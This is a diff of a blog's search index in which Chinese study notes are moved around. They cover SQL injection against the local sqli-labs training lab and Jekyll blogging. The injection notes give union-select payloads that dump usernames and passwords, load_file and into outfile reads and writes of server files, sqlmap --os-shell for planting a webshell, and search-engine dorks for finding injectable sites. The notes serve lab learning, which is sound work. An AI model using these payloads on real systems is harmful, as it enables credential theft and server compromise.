-<pre><code>web.mdb
-
-select [*] from admin
-select [*] from system
-
-select [username] from system
-select [name] from system
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/04.png" alt=""></p>
-<p>提权</p>
-<pre><code>xp.cmdshell
-
---os-shell // 执行系统命令 写webshell到网站目录
-</code></pre>]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建</title>
-    <url>/post/2284174451.html</url>
-    <content><![CDATA[<h2 id="SQL注入练习环境搭建"><a href="#SQL注入练习环境搭建" class="headerlink" title="SQL注入练习环境搭建"></a>SQL注入练习环境搭建</h2><p>Sqli-labs<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>  </p>
-<ul>
-<li>报错注入  </li>
-<li>盲注</li>
-<li>Update注入</li>
-<li>Insert注入</li>
-<li>Header注入</li>
-<li>二阶注入</li>
-<li>绕过WADF</li>
-</ul>
-<ol>
-<li>PHP+MySql+Apache<br>WAMP<br>windows  </li>
-</ol>
-<ul>
-<li>下载安装WAMP <a href="http://www.wampserver.com/en/" target="_blank" rel="noopener">http://www.wampserver.com/en/</a></li>
-<li>WAMP的www目录下 解压缩sqli-labs</li>
-<li>启动服务器</li>
-<li>配置数据库（root）phpMyadamin </li>
-<li>修改配置 sqli-labs/sql-connections/db-creds.inc</li>
-<li><a href="http://localhost/sqli-labs" target="_blank" rel="noopener">http://localhost/sqli-labs</a>  点击 setup/reset database for labs</li>
-</ul>
-<ol start="2">
-<li>Docker</li>
-</ol>
-<ul>
-<li>docker search sqli-labs</li>
-<li>docker pull acgplano/sqli-labs</li>
-<li>docker images</li>
-<li>docker run -dt --name sqli -p 80:80 --rm acgplano/sqli-labs  (-dt 后台运行 –name 命名 -p 端口名  80:80 本地：docker --rm 当停止后删除产生镜像)</li>
-</ul>
-<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>对应代码，边看代码边理解，学会一半，就基本没问题。  </p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.1.1-SQL注入-SQL注入基础-SQL手工注入方法</title>
-    <url>/post/1129050045.html</url>
-    <content><![CDATA[<h2 id="MySQL手工注入"><a href="#MySQL手工注入" class="headerlink" title="MySQL手工注入"></a>MySQL手工注入</h2><h3 id="01-MySQL数据库结构"><a href="#01-MySQL数据库结构" class="headerlink" title="01 MySQL数据库结构"></a>01 MySQL数据库结构</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/02.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/03.jpg" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/04.png" alt=""></p>
-<p>核心原理：<br>MySql内置的infromation_schema库，它功能强大，是我们进行MySql注入的基石！<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/05.png" alt=""></p>
-<pre><code>select schema_name from information_schema.schemata // 查库
-select table_name from information_schema.tables where table_schema=库名 // 查表
-select column_name from information_schema.columns where table_name=表名 // 查列
-select 列名 from 库名.表名 // 查数据
-
-
-select column_name from information_schema.columns where table_name=0x7573657273;
-
-
-![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/06.png)
-
-select group_concat(schema_name) from information_schema.schemata;
-select username,password from security.users limit 0,1;
-</code></pre><hr>
-<h3 id="02-MySQL手工注入方法"><a href="#02-MySQL手工注入方法" class="headerlink" title="02 MySQL手工注入方法"></a>02 MySQL手工注入方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/07.jpg" alt=""></p>
-<pre><code>http://127.0.0.1/Less-1/?id=2
-http://127.0.0.1/Less-1/?id=2&#39; 注入点
-http://127.0.0.1/Less-1/?id=2&#39; and &#39;1&#39;=&#39;1 正常
-http://127.0.0.1/Less-1/?id=2&#39; and &#39;1&#39;=&#39;2 报错
-
-http://127.0.0.1/Less-1/?id=2&#39; order by 3--+ 判断字段长度
-http://127.0.0.1/Less-1/?id=2&#39; order by 4--+ 返回错误
-
-http://127.0.0.1/Less-1/?id=2&#39; union select 1,2,3--+
-http://127.0.0.1/Less-1/?id=-1&#39; union select 1,2,3--+ 判断数据显示位置
-
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+ 提示more than 1 row 查询库名
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+ 当前库
-
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select concat_ws(&#39;~&#39;,username,password) from security.users limit 0,1)--+
-
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+
-
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+
-
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select database())--+
-
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select load_file(&#39;/var/www/html/sql-connections/db-creds.inc&#39;))--+ 读文件
-
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select &#39;test&#39; into outfile &#39;/var/www/html/sql-connections/t.txt&#39;)--+ 写文件
-
-http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select &#39;test&#39; into outfile &#39;/tmp/t.txt&#39;)--+ 写文件
-</code></pre><p><a href="http://127.0.0.1:90/Less-1/" target="_blank" rel="noopener">http://127.0.0.1:90/Less-1/</a></p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -11772,6 +11613,188 @@ cd /var/www/html/Less-1
       </tags>
   </entry>
   <entry>
+    <title>1.1.1-SQL注入-SQL注入基础-SQL注入流程</title>
+    <url>/post/820776471.html</url>
+    <content><![CDATA[<h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><h4 id="01-寻找SQL注入点"><a href="#01-寻找SQL注入点" class="headerlink" title="01 寻找SQL注入点"></a>01 寻找SQL注入点</h4><h5 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h5><p>无特定目标：<br>inurl:.php?id=  </p>
+<p>有特定目标：<br>inurl:.php?id=site:target.com<br>// jsp sid   </p>
+<p>工具爬取：<br>spider,对搜索引擎和目标网站的链接进行爬取  </p>
+<p><strong>注入识别</strong><br>手工简单识别：  </p>
+<pre><code>&#39;
+and 1=1 / and 1=2
+and &#39;1&#39;=&#39;1 / and &#39;1&#39;=&#39;2 
+and 1 like 1 / and 1 like 2
+</code></pre><p>工具识别：  </p>
+<pre><code>sqlmap -m filename (filename中保存检测目标)
+sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试)
+</code></pre><p><strong>高级识别：</strong><br>扩展识别广度和深度：  </p>
+<pre><code>SqlMap --level 增加测试级别，对header中相关参数也进行测试
+sqlmap -r filename (filename中为网站请求数据)
+</code></pre><p>利用工具提高识别效率：</p>
+<pre><code>BurpSuite + SqlMap
+BurpSuite拦截所有浏览器访问提交的数据
+BurpSuite扩展插件，直接调用SqlMap进行测试
+</code></pre><p>一些Tips：  </p>
+<p>可以在参数后键入“*” 来确定想要测试的参数<br>可能出现注入的点：新闻、登录、搜索、留言… …<br>站在开发的角度去寻找  </p>
+<hr>
+<pre><code>python sqlmap.py -r 1.txt
+</code></pre><p>burp sqlmap 扩展<br>Burp-&gt; Extender-&gt;BApp Store -&gt; SQLiPy Sqlmap  </p>
+<p><strong>代码审计：</strong></p>
+<p>搜索关键代码和函数<br>梳理业务流程  </p>
+<p>强网杯WEB “python is the best language”  </p>
+<pre><code>http://test.com/register  
+POST:  
+
+username=test&amp;email=t@t.com&amp;password=123&amp;password2=123&amp;submit=Register  
+username=test&amp;email=t@t.com&#39; and &#39;1&#39; = &#39;1&amp;password=123&amp;password2=123&amp;submit=Register  
+</code></pre><h4 id="02-SQL注入流程"><a href="#02-SQL注入流程" class="headerlink" title="02 SQL注入流程"></a>02 SQL注入流程</h4><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/03.png" alt=""></p>
+<p>数据获取</p>
+<pre><code>web.mdb
+
+select [*] from admin
+select [*] from system
+
+select [username] from system
+select [name] from system
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/04.png" alt=""></p>
+<p>提权</p>
+<pre><code>xp.cmdshell
+
+--os-shell // 执行系统命令 写webshell到网站目录
+</code></pre>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.1.1-SQL注入-SQL注入基础-SQL手工注入方法</title>
+    <url>/post/1129050045.html</url>
+    <content><![CDATA[<h2 id="MySQL手工注入"><a href="#MySQL手工注入" class="headerlink" title="MySQL手工注入"></a>MySQL手工注入</h2><h3 id="01-MySQL数据库结构"><a href="#01-MySQL数据库结构" class="headerlink" title="01 MySQL数据库结构"></a>01 MySQL数据库结构</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/02.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/03.jpg" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/04.png" alt=""></p>
+<p>核心原理：<br>MySql内置的infromation_schema库，它功能强大，是我们进行MySql注入的基石！<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/05.png" alt=""></p>
+<pre><code>select schema_name from information_schema.schemata // 查库
+select table_name from information_schema.tables where table_schema=库名 // 查表
+select column_name from information_schema.columns where table_name=表名 // 查列
+select 列名 from 库名.表名 // 查数据
+
+
+select column_name from information_schema.columns where table_name=0x7573657273;
+
+
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/06.png)
+
+select group_concat(schema_name) from information_schema.schemata;
+select username,password from security.users limit 0,1;
+</code></pre><hr>
+<h3 id="02-MySQL手工注入方法"><a href="#02-MySQL手工注入方法" class="headerlink" title="02 MySQL手工注入方法"></a>02 MySQL手工注入方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/07.jpg" alt=""></p>
+<pre><code>http://127.0.0.1/Less-1/?id=2
+http://127.0.0.1/Less-1/?id=2&#39; 注入点
+http://127.0.0.1/Less-1/?id=2&#39; and &#39;1&#39;=&#39;1 正常
+http://127.0.0.1/Less-1/?id=2&#39; and &#39;1&#39;=&#39;2 报错
+
+http://127.0.0.1/Less-1/?id=2&#39; order by 3--+ 判断字段长度
+http://127.0.0.1/Less-1/?id=2&#39; order by 4--+ 返回错误
+
+http://127.0.0.1/Less-1/?id=2&#39; union select 1,2,3--+
+http://127.0.0.1/Less-1/?id=-1&#39; union select 1,2,3--+ 判断数据显示位置
+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+ 提示more than 1 row 查询库名
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+ 当前库
+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select concat_ws(&#39;~&#39;,username,password) from security.users limit 0,1)--+
+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+
+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+
+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select database())--+
+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select load_file(&#39;/var/www/html/sql-connections/db-creds.inc&#39;))--+ 读文件
+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select &#39;test&#39; into outfile &#39;/var/www/html/sql-connections/t.txt&#39;)--+ 写文件
+
+http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select &#39;test&#39; into outfile &#39;/tmp/t.txt&#39;)--+ 写文件
+</code></pre><p><a href="http://127.0.0.1:90/Less-1/" target="_blank" rel="noopener">http://127.0.0.1:90/Less-1/</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建</title>
+    <url>/post/2284174451.html</url>
+    <content><![CDATA[<h2 id="SQL注入练习环境搭建"><a href="#SQL注入练习环境搭建" class="headerlink" title="SQL注入练习环境搭建"></a>SQL注入练习环境搭建</h2><p>Sqli-labs<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>  </p>
+<ul>
+<li>报错注入  </li>
+<li>盲注</li>
+<li>Update注入</li>
+<li>Insert注入</li>
+<li>Header注入</li>
+<li>二阶注入</li>
+<li>绕过WADF</li>
+</ul>
+<ol>
+<li>PHP+MySql+Apache<br>WAMP<br>windows  </li>
+</ol>
+<ul>
+<li>下载安装WAMP <a href="http://www.wampserver.com/en/" target="_blank" rel="noopener">http://www.wampserver.com/en/</a></li>
+<li>WAMP的www目录下 解压缩sqli-labs</li>
+<li>启动服务器</li>
+<li>配置数据库（root）phpMyadamin </li>
+<li>修改配置 sqli-labs/sql-connections/db-creds.inc</li>
+<li><a href="http://localhost/sqli-labs" target="_blank" rel="noopener">http://localhost/sqli-labs</a>  点击 setup/reset database for labs</li>
+</ul>
+<ol start="2">
+<li>Docker</li>
+</ol>
+<ul>
+<li>docker search sqli-labs</li>
+<li>docker pull acgplano/sqli-labs</li>
+<li>docker images</li>
+<li>docker run -dt --name sqli -p 80:80 --rm acgplano/sqli-labs  (-dt 后台运行 –name 命名 -p 端口名  80:80 本地：docker --rm 当停止后删除产生镜像)</li>
+</ul>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>对应代码，边看代码边理解，学会一半，就基本没问题。  </p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jekyll blog的命令</title>
+    <url>/post/491554107.html</url>
+    <content><![CDATA[<h2 id="blog命令"><a href="#blog命令" class="headerlink" title="blog命令"></a>blog命令</h2><ol>
+<li><p>新建文件</p>
+<p> echo &gt; index.md<br> touch index.md</p>
+</li>
+<li><p>运行jekyll服务</p>
+<p> jekyll serve</p>
+</li>
+<li><p>rake生成文章</p>
+<p> rake post title=”article name”</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>jekyll</category>
+      </categories>
+      <tags>
+        <tag>blog</tag>
+        <tag>jekyll</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python搭建环境</title>
     <url>/post/165310662.html</url>
     <content><![CDATA[<p><a href="https://www.python.org/" target="_blank" rel="noopener">python</a></p>
@@ -11806,19 +11829,89 @@ print(os.path.abspath(&#39;.&#39;))
       </tags>
   </entry>
   <entry>
-    <title>jekyll blog的命令</title>
-    <url>/post/491554107.html</url>
-    <content><![CDATA[<h2 id="blog命令"><a href="#blog命令" class="headerlink" title="blog命令"></a>blog命令</h2><ol>
-<li><p>新建文件</p>
-<p> echo &gt; index.md<br> touch index.md</p>
-</li>
-<li><p>运行jekyll服务</p>
-<p> jekyll serve</p>
-</li>
-<li><p>rake生成文章</p>
-<p> rake post title=”article name”</p>
-</li>
-</ol>
+    <title>jekyll添加文章流程</title>
+    <url>/post/2293620199.html</url>
+    <content><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>需要在jekyll博客下生产<a href="https://github.com/tea9/blog_v2/blob/master/rakefile.rb" target="_blank" rel="noopener">rakefile.rb</a>文件    </p>
+<h2 id="1-创建文章"><a href="#1-创建文章" class="headerlink" title="1.创建文章"></a>1.创建文章</h2><p>使用命令  </p>
+<pre><code>rake post title=&quot;文章名称&quot;
+</code></pre><h2 id="2-编辑文章"><a href="#2-编辑文章" class="headerlink" title="2.编辑文章"></a>2.编辑文章</h2><p>使用编辑器编写文章</p>
+<h2 id="3-本地预览"><a href="#3-本地预览" class="headerlink" title="3.本地预览"></a>3.本地预览</h2><p>运行命令</p>
+<pre><code>jekyll serve
+</code></pre><p>访问浏览器</p>
+<pre><code>http://127.0.0.1:4000/
+</code></pre><h2 id="4-把新建的文章上传到github"><a href="#4-把新建的文章上传到github" class="headerlink" title="4.把新建的文章上传到github"></a>4.把新建的文章上传到github</h2><p>运行命令</p>
+<pre><code>git init
+git add --all
+git commit -m &quot;add post&quot;
+git push -u origin master
+</code></pre><h2 id="5-在线预览"><a href="#5-在线预览" class="headerlink" title="5.在线预览"></a>5.在线预览</h2><p>访问网址</p>
+<pre><code>https://tea9.github.io
+</code></pre><h2 id="rakefile-rb代码"><a href="#rakefile-rb代码" class="headerlink" title="rakefile.rb代码"></a>rakefile.rb代码</h2><pre><code>require &#39;rake&#39;
+require &#39;yaml&#39;
+
+SOURCE = &quot;.&quot;
+CONFIG = {
+  &#39;posts&#39; =&gt; File.join(SOURCE, &quot;_posts&quot;),
+  &#39;drafts&#39; =&gt; File.join(SOURCE, &quot;_drafts&quot;),
+  &#39;post_ext&#39; =&gt; &quot;md&quot;,
+}
+
+# Usage: rake post title=&quot;A Title&quot;
+desc &quot;Begin a new post in #{CONFIG[&#39;posts&#39;]}&quot;
+task :post do
+  abort(&quot;rake aborted: &#39;#{CONFIG[&#39;posts&#39;]}&#39; directory not found.&quot;) unless FileTest.directory?(CONFIG[&#39;posts&#39;])
+  title = ENV[&quot;title&quot;] || &quot;new-post&quot;
+  slug = title.downcase.strip.gsub(&#39; &#39;, &#39;-&#39;).gsub(/[^\w-]/, &#39;&#39;)
+  filename = File.join(CONFIG[&#39;posts&#39;], &quot;#{Time.now.strftime(&#39;%Y-%m-%d&#39;)}-#{slug}.#{CONFIG[&#39;post_ext&#39;]}&quot;)
+  if File.exist?(filename)
+    abort(&quot;rake aborted!&quot;) if ask(&quot;#{filename} already exists. Do you want to overwrite?&quot;, [&#39;y&#39;, &#39;n&#39;]) == &#39;n&#39;
+  end
+
+  puts &quot;Creating new post: #{filename}&quot;
+
+
+  open(filename, &#39;w&#39;) do |post|
+    post.puts &quot;---&quot;
+    post.puts &quot;layout: post&quot;
+    post.puts &quot;title: \&quot;#{title.gsub(/-/,&#39; &#39;)}\&quot;&quot;
+    # post.puts &quot;subtitle: \&quot;\&quot;&quot;
+    post.puts &quot;date: #{Time.now.strftime(&#39;%Y-%m-%d&#39;)}&quot;
+    # post.puts &quot;cover: &quot;
+    post.puts &quot;category: &quot;
+    post.puts &quot;tags: &quot;
+    post.puts &quot;---&quot;
+  end
+
+
+end # task :post
+
+## 第二个命令
+desc &quot;Begin a new post in #{CONFIG[&#39;drafts&#39;]}&quot;
+task :draft do
+  abort(&quot;rake aborted: &#39;#{CONFIG[&#39;drafts&#39;]}&#39; directory not found.&quot;) unless FileTest.directory?(CONFIG[&#39;drafts&#39;])
+  title = ENV[&quot;title&quot;] || &quot;new-post&quot;
+  slug = title.downcase.strip.gsub(&#39; &#39;, &#39;-&#39;).gsub(/[^\w-]/, &#39;&#39;)
+  filename = File.join(CONFIG[&#39;drafts&#39;], &quot;#{Time.now.strftime(&#39;%Y-%m-%d&#39;)}-#{slug}.#{CONFIG[&#39;post_ext&#39;]}&quot;)
+  if File.exist?(filename)
+    abort(&quot;rake aborted!&quot;) if ask(&quot;#{filename} already exists. Do you want to overwrite?&quot;, [&#39;y&#39;, &#39;n&#39;]) == &#39;n&#39;
+  end
+
+  puts &quot;Creating new post: #{filename}&quot;
+
+
+  open(filename, &#39;w&#39;) do |post|
+    post.puts &quot;---&quot;
+    post.puts &quot;layout: post&quot;
+    post.puts &quot;title: \&quot;#{title.gsub(/-/,&#39; &#39;)}\&quot;&quot;
+    # post.puts &quot;subtitle: \&quot;\&quot;&quot;
+    post.puts &quot;date: #{Time.now.strftime(&#39;%Y-%m-%d&#39;)}&quot;
+    # post.puts &quot;cover: &quot;
+    post.puts &quot;category: &quot;
+    post.puts &quot;tags: &quot;
+    post.puts &quot;---&quot;
+  end
+end
+</code></pre><p>CONFIG 配置的路径<br>desc 命令行输出信息<br>task 命令<br>在后面ruby是生成文件的相关逻辑  </p>
 ]]></content>
       <categories>
         <category>jekyll</category>
@@ -11927,99 +12020,6 @@ git push -u origin master
       </categories>
       <tags>
         <tag>blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jekyll添加文章流程</title>
-    <url>/post/2293620199.html</url>
-    <content><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>需要在jekyll博客下生产<a href="https://github.com/tea9/blog_v2/blob/master/rakefile.rb" target="_blank" rel="noopener">rakefile.rb</a>文件    </p>
-<h2 id="1-创建文章"><a href="#1-创建文章" class="headerlink" title="1.创建文章"></a>1.创建文章</h2><p>使用命令  </p>
-<pre><code>rake post title=&quot;文章名称&quot;
-</code></pre><h2 id="2-编辑文章"><a href="#2-编辑文章" class="headerlink" title="2.编辑文章"></a>2.编辑文章</h2><p>使用编辑器编写文章</p>
-<h2 id="3-本地预览"><a href="#3-本地预览" class="headerlink" title="3.本地预览"></a>3.本地预览</h2><p>运行命令</p>
-<pre><code>jekyll serve
-</code></pre><p>访问浏览器</p>
-<pre><code>http://127.0.0.1:4000/
-</code></pre><h2 id="4-把新建的文章上传到github"><a href="#4-把新建的文章上传到github" class="headerlink" title="4.把新建的文章上传到github"></a>4.把新建的文章上传到github</h2><p>运行命令</p>
-<pre><code>git init
-git add --all
-git commit -m &quot;add post&quot;
-git push -u origin master
-</code></pre><h2 id="5-在线预览"><a href="#5-在线预览" class="headerlink" title="5.在线预览"></a>5.在线预览</h2><p>访问网址</p>
-<pre><code>https://tea9.github.io
-</code></pre><h2 id="rakefile-rb代码"><a href="#rakefile-rb代码" class="headerlink" title="rakefile.rb代码"></a>rakefile.rb代码</h2><pre><code>require &#39;rake&#39;
-require &#39;yaml&#39;
-
-SOURCE = &quot;.&quot;
-CONFIG = {
-  &#39;posts&#39; =&gt; File.join(SOURCE, &quot;_posts&quot;),
-  &#39;drafts&#39; =&gt; File.join(SOURCE, &quot;_drafts&quot;),
-  &#39;post_ext&#39; =&gt; &quot;md&quot;,
-}
-
-# Usage: rake post title=&quot;A Title&quot;
-desc &quot;Begin a new post in #{CONFIG[&#39;posts&#39;]}&quot;
-task :post do
-  abort(&quot;rake aborted: &#39;#{CONFIG[&#39;posts&#39;]}&#39; directory not found.&quot;) unless FileTest.directory?(CONFIG[&#39;posts&#39;])
-  title = ENV[&quot;title&quot;] || &quot;new-post&quot;
-  slug = title.downcase.strip.gsub(&#39; &#39;, &#39;-&#39;).gsub(/[^\w-]/, &#39;&#39;)
-  filename = File.join(CONFIG[&#39;posts&#39;], &quot;#{Time.now.strftime(&#39;%Y-%m-%d&#39;)}-#{slug}.#{CONFIG[&#39;post_ext&#39;]}&quot;)
-  if File.exist?(filename)
-    abort(&quot;rake aborted!&quot;) if ask(&quot;#{filename} already exists. Do you want to overwrite?&quot;, [&#39;y&#39;, &#39;n&#39;]) == &#39;n&#39;
-  end
-
-  puts &quot;Creating new post: #{filename}&quot;
-
-
-  open(filename, &#39;w&#39;) do |post|
-    post.puts &quot;---&quot;
-    post.puts &quot;layout: post&quot;
-    post.puts &quot;title: \&quot;#{title.gsub(/-/,&#39; &#39;)}\&quot;&quot;
-    # post.puts &quot;subtitle: \&quot;\&quot;&quot;
-    post.puts &quot;date: #{Time.now.strftime(&#39;%Y-%m-%d&#39;)}&quot;
-    # post.puts &quot;cover: &quot;
-    post.puts &quot;category: &quot;
-    post.puts &quot;tags: &quot;
-    post.puts &quot;---&quot;
-  end
-
-
-end # task :post
-
-## 第二个命令
-desc &quot;Begin a new post in #{CONFIG[&#39;drafts&#39;]}&quot;
-task :draft do
-  abort(&quot;rake aborted: &#39;#{CONFIG[&#39;drafts&#39;]}&#39; directory not found.&quot;) unless FileTest.directory?(CONFIG[&#39;drafts&#39;])
-  title = ENV[&quot;title&quot;] || &quot;new-post&quot;
-  slug = title.downcase.strip.gsub(&#39; &#39;, &#39;-&#39;).gsub(/[^\w-]/, &#39;&#39;)
-  filename = File.join(CONFIG[&#39;drafts&#39;], &quot;#{Time.now.strftime(&#39;%Y-%m-%d&#39;)}-#{slug}.#{CONFIG[&#39;post_ext&#39;]}&quot;)
-  if File.exist?(filename)
-    abort(&quot;rake aborted!&quot;) if ask(&quot;#{filename} already exists. Do you want to overwrite?&quot;, [&#39;y&#39;, &#39;n&#39;]) == &#39;n&#39;
-  end
-
-  puts &quot;Creating new post: #{filename}&quot;
-
-
-  open(filename, &#39;w&#39;) do |post|
-    post.puts &quot;---&quot;
-    post.puts &quot;layout: post&quot;
-    post.puts &quot;title: \&quot;#{title.gsub(/-/,&#39; &#39;)}\&quot;&quot;
-    # post.puts &quot;subtitle: \&quot;\&quot;&quot;
-    post.puts &quot;date: #{Time.now.strftime(&#39;%Y-%m-%d&#39;)}&quot;
-    # post.puts &quot;cover: &quot;
-    post.puts &quot;category: &quot;
-    post.puts &quot;tags: &quot;
-    post.puts &quot;---&quot;
-  end
-end
-</code></pre><p>CONFIG 配置的路径<br>desc 命令行输出信息<br>task 命令<br>在后面ruby是生成文件的相关逻辑  </p>
-]]></content>
-      <categories>
-        <category>jekyll</category>
-      </categories>
-      <tags>
-        <tag>blog</tag>
-        <tag>jekyll</tag>
       </tags>
   </entry>
   <entry>
